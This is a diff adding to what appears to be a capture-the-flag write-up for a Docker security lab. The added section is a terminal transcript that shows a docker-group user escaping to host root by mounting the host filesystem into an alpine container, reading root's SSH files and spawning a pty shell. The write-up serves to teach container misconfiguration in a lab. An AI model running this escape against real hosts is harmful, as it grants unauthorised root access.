@@ -241,6 +241,73 @@ Building cache...
 <h2>Task 7 . Vulnerability #3: Uploading Malicious Docker Images</h2>
 
 
+<br>
+<p><em>Answer the questions below</em></p>
+
+<p>7.1. Escape Successful<br>
+<code>No asnwer needed</code></p>
+
+```bash
+root@ip-10-201-47-228:~/TheDockerRodeo# ssh danny@10.201.72.13 -p 2233
+The authenticity of host '[10.201.72.13]:2233 ([10.201.72.13]:2233)' can't be established.
+ECDSA key fingerprint is SHA256:7oK8ZTV//nYMLxtlI8foW0/nO7lqjhwXRAG+YS/kYx8.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.201.72.13]:2233' (ECDSA) to the list of known hosts.
+danny@10.201.72.13's password: 
+danny@3d8fe1db6635:~$ id
+uid=1000(danny) gid=1000(danny) groups=1000(danny),999(docker)
+danny@3d8fe1db6635:~$ pwd
+/home/danny
+danny@3d8fe1db6635:~$ cd /var/run
+danny@3d8fe1db6635:/var/run$ ls -la | grep sock
+srw-rw---- 1 root docker    0 Aug 14 22:30 docker.sock
+danny@3d8fe1db6635:/var/run$ groups
+danny docker
+danny@3d8fe1db6635:/var/run$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+# id
+uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
+# pwd
+/
+# groups
+root daemon bin sys adm disk uucp groups: cannot find name for group ID 11
+11 dialout tape sudo
+# cd /root
+# ls -lah
+total 28K
+drwx------  4 root root 4.0K Nov 10  2020 .
+drwxr-xr-x 24 root root 4.0K Nov 12  2020 ..
+-rw-------  1 root root  406 Nov 13  2020 .bash_history
+-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
+drwxr-xr-x  3 root root 4.0K Oct 24  2020 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+drwx------  2 root root 4.0K Nov 12  2020 .ssh
+# cat authorized_keys
+cat: authorized_keys: No such file or directory
+# cd .ssh
+# cat authorized_keys
+# pwd
+/root/.ssh
+# ls
+authorized_keys  known_hosts
+# cd authorized_keys
+sh: 11: cd: can't cd to authorized_keys
+# cat known_hosts
+|1|/EHt5UUsnI9hqwcLMFA5TdvNtrs=|qihaDMUpcVI9fwvdha7PesRjel4= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOZqllWCjU44z6Ho/Klb55xcniFu7VomYL0mtptJjIIJMH+XeCJ7USG+BWA/OM6qfSkOpmHRqQyWmq5tukju+2s=
+# 
+```
+
+```bash
+# python3 -c 'import pty;pty.spawn("/bin/bash")'
+groups: cannot find name for group ID 11
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+root@cb1207065aac:~/.ssh# 
+```
+
+
+<br>
+<br>
 <h2>Task 8 . Vulnerability #4: RCE via Exposed Docker Daemon</h2>
 
 
@@ -249,6 +316,16 @@ Building cache...
 
 <h2>Task 10 . Vulnerability #6: Shared Namespaces</h2>
 
+
+
+
+<img width="1227" height="264" alt="image" src="https://github.com/user-attachments/assets/3ba4db80-344d-4e2e-a9ae-f1b1b6f741a5" />
+
+<br>
+
+<img width="1229" height="417" alt="image" src="https://github.com/user-attachments/assets/7360a20b-0e4f-432f-98df-9a935ed36ec9" />
+
+<br>
 
 <h2>Task 11 . Vulnerability #7: Misconfigured Privileges (Deploy #2)</h2>
 <p>[ Start Machine</p>
